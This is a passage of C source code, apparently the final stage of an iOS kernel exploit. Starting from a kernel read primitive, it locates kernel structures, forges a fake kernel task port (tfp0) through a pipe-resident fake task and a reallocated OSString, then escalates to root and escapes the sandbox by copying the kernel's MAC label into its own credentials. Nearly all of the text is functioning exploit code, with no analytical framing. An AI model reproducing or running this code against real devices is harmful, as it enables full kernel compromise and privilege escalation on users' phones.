    uint64_t ourproc_crlabel_addr = 0;
    kret = EarlyKernelRead64(ourproc_ucred_addr + UCRED_CR_LABEL_OFFSET,
            &ourproc_crlabel_addr);

    CHECK_ERROR(kret, "Couldn't get pointer to our proc's MAC label: %s\n",
            mach_error_string(kret));

    printf("Our proc's MAC label is at %#llx\n", ourproc_crlabel_addr);

    uint64_t kernproc_kaddr = 0;
    uint64_t curproc_kaddr = ourproc_kaddr;

    for(;;){
        uint32_t pid = -1;
        kret = EarlyKernelRead32(curproc_kaddr + PROC_PID_OFFSET, &pid);

        CHECK_ERROR(kret, "finding kernproc: %s, read PID, curproc_kaddr = %#llx\n",
                mach_error_string(kret), curproc_kaddr);

        if(pid == 0){
            kernproc_kaddr = curproc_kaddr;
            break;
        }

        kret = EarlyKernelRead64(curproc_kaddr, &curproc_kaddr);

        CHECK_ERROR(kret, "finding kernproc: %s, going backwards, curproc_kaddr = %#llx\n",
                mach_error_string(kret), curproc_kaddr);
    }

    printf("Kernel proc struct is at %#llx\n", kernproc_kaddr);

    uint64_t kerntask_kaddr = 0;
    kret = EarlyKernelRead64(kernproc_kaddr + PROC_TASK_OFFSET, &kerntask_kaddr);

    CHECK_ERROR(kret, "Couldn't find kernel's task struct: %s\n",
            mach_error_string(kret));

    printf("Kernel task struct is at %#llx\n", kerntask_kaddr);

    uint64_t kern_ucred_kaddr = 0;
    kret = EarlyKernelRead64(kernproc_kaddr + PROC_UCRED_OFFSET, &kern_ucred_kaddr);

    CHECK_ERROR(kret, "Couldn't find kernel's credentials: %s\n",
            mach_error_string(kret));

    printf("Kernel's credentials are at %#llx\n", kern_ucred_kaddr);

    uint64_t kern_crlabel_kaddr = 0;
    kret = EarlyKernelRead64(kern_ucred_kaddr + UCRED_CR_LABEL_OFFSET,
            &kern_crlabel_kaddr);

    CHECK_ERROR(kret, "Couldn't find kernel's credentials: %s\n",
            mach_error_string(kret));

    printf("Kernel's MAC label is at %#llx\n", kern_crlabel_kaddr);

    uint64_t kern_vmmap_kaddr = 0;
    kret = EarlyKernelRead64(kerntask_kaddr + TASK_VMMAP_OFFSET, &kern_vmmap_kaddr);

    CHECK_ERROR(kret, "Couldn't find kernel's vm_map: %s\n",
            mach_error_string(kret));

    printf("Kernel vm_map is at %#llx\n", kern_vmmap_kaddr);

    /* now we have the pointers we need to build a fake kernel task port */
    reclaimed_fakeport->ip_receiver = kern_ipc_space_kaddr;

    ktask_t *faketask = calloc(1, 0x600);
    faketask->lock.data = 0;
    faketask->lock.type = 0x22;
    faketask->ref_count = 100;
    faketask->active = 1;
    faketask->map = kern_vmmap_kaddr;

    /* place our fake task into a pipe so it resides in kernel memory */
    int taskpipe[2];
    CHECK_ERROR(pipe(taskpipe), "pipe: %s\n", strerror(errno));

    write(taskpipe[1], &PIPE_MAGIC, sizeof(PIPE_MAGIC));
    write(taskpipe[1], faketask, 0x600);

    free(faketask);
    faketask = NULL;

    uint64_t *pipes = NULL;
    int pipecnt = 0;
    kret = proc_pipes(target_port, ourproc_kaddr, &pipes, &pipecnt);

    CHECK_ERROR(kret, "proc_pipes: %s\n", mach_error_string(kret));

    uint64_t faketask_kaddr = 0;

    for(int i=0; i<pipecnt; i++){
        uint64_t pipebuf = 0;
        kret = EarlyKernelRead64(pipes[i] + PIPE_PIPEBUF_BUFFER_OFF, &pipebuf);

        CHECK_ERROR(kret, "pipes[%d] + PIPE_PIPEBUF_BUFFER_OFF: %s\n", i,
                mach_error_string(kret));

        if(!pipebuf)
            continue;

        uint64_t val = 0;
        kret = EarlyKernelRead64(pipebuf, &val);

        CHECK_ERROR(kret, "pipebuf+0: %s\n", mach_error_string(kret));

        if(val == PIPE_MAGIC){
            printf("Found the pipe where our fake task resides in\n");
            faketask_kaddr = pipebuf + sizeof(PIPE_MAGIC);
            break;
        }
    }

    free(pipes);
    pipes = NULL;

    CHECK_ERROR(faketask_kaddr == 0, "Couldn't find fake task\n");

    printf("Our fake task lives at %#llx\n", faketask_kaddr);

    reclaimed_fakeport->ip_kobject = faketask_kaddr;

    /* reallocate one last time for a fake tfp0 */
    kret = realloc_OSString(connection, surface_id, OSString_key, reclaimed_fakeport);

    CHECK_ERROR(kret, "Couldn't reallocate our fake port: %s\n",
            mach_error_string(kret));

    context = 0;
    kret = mach_port_get_context(mach_task_self(), target_port, &context);

    CHECK_ERROR(kret, "third mach_port_get_context on target_port: %s\n",
            mach_error_string(kret));

    if(MAGIC_FROM_CONTEXT(context) == CONTEXT_MAGIC)
        printf("Got good context magic, context: %#lx\n", context);
    else{
        printf("Bad context %#lx\n", context);
        mach_ports_register(mach_task_self(), NULL, 0);
        return FAILED;
    }

    uint64_t _end = mach_absolute_time();
    uint64_t time = _end - _start;

    time *= info.numer;
    time /= info.denom;

    OSString_key = KEY_FROM_CONTEXT(context);
    OSString_off = OFFSET_FROM_CONTEXT(context);

    printf("Our fake tfp0 was reallocated %#x bytes from OSString %d\n",
            OSString_key, OSString_off);

    /* now target_port is a fake kernel task port */
    mach_port_t tfp0 = target_port;

    printf("Got tfp0 in %lld ms\n", time / 1000000);
    printf("UID: %d\n", getuid());

    uid_t orig_uid, orig_ruid, orig_svuid;
    gid_t orig_rgid, orig_svgid;

    if(root(tfp0, ourproc_ucred_addr, &orig_uid, &orig_ruid, &orig_svuid,
                &orig_rgid, &orig_svgid)){
        mach_ports_register(mach_task_self(), NULL, 0);
        return FAILED;
    }

    printf("UID: %d\n", getuid());

    kret = KernelWrite(tfp0, ourproc_ucred_addr + UCRED_CR_LABEL_OFFSET,
            kern_crlabel_kaddr, sizeof(uint64_t));

    CHECK_ERROR(kret, "Couldn't copy kernel's MAC label: %s\n",
            mach_error_string(kret));

    FILE *f = fopen("/var/mobile/milo", "w");

    CHECK_ERROR(!f, "Not out of the sandbox? %s\n", strerror(errno));

    fclose(f);

    printf("Unsandboxed\n");

    /* de-elevate so this app can be killed by Xcode, I'm sure this
     * has other benefits as well
     */
    kret = KernelWrite(tfp0, ourproc_ucred_addr + UCRED_CR_LABEL_OFFSET,
            ourproc_crlabel_addr, sizeof(uint64_t));

    CHECK_ERROR(kret, "Couldn't restore our creds: %s\n", mach_error_string(kret));

    if(unroot(tfp0, ourproc_ucred_addr, orig_uid, orig_ruid, orig_svuid,
                orig_rgid, orig_svgid)){
        mach_ports_register(mach_task_self(), NULL, 0);
        return FAILED;
    }

    mach_ports_register(mach_task_self(), NULL, 0);

    *tfp0out = tfp0;

    return 0;
}
